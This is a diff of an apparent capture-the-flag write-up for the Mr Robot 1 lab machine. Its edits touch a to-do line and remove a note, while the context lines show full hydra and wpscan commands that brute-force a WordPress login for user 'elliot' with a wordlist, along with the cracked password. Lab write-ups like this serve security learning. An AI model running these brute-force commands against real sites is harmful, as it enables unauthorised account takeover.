@@ -62,10 +62,9 @@ Explanation of how the `hydra` command works:
 * Run `hydra -l elliot -P fsocity2.dic 10.0.2.5 http-post-form '/wp-login.php:log=elliot&pwd=^PASS^:S=Dashboard'`:
 ![](/screenshots/mr-robot-1/hydraBruteForcePassword.jpg)
 * It took around 10 minutes for me to get the password `ER28-0652`.
-* To-do: Perhaps find some configuration to speed up the brute-forcing process because `wpscan` took only a minute vs. hydra's 10 minutes.
+* To-do: *Perhaps find some alternative configuration to speed up the brute-forcing process because `wpscan` took only a minute vs. hydra's 10 minutes*.
 
 # Brute-force elliot's password using wpscan #
-* -Retry to confirm that it really took only 30 seconds-
 * Use `wpscan` instead to brute-force the password for user elliot: run `wpscan --url 10.0.2.5 --usernames elliot --passwords fsocity2.dic`:
 ![](/screenshots/mr-robot-1/wpScanBruteForcePassword.jpg)
 * It took only around a minute to get the password `ER28-0652`, which was way faster than our attempt using `hydra`.
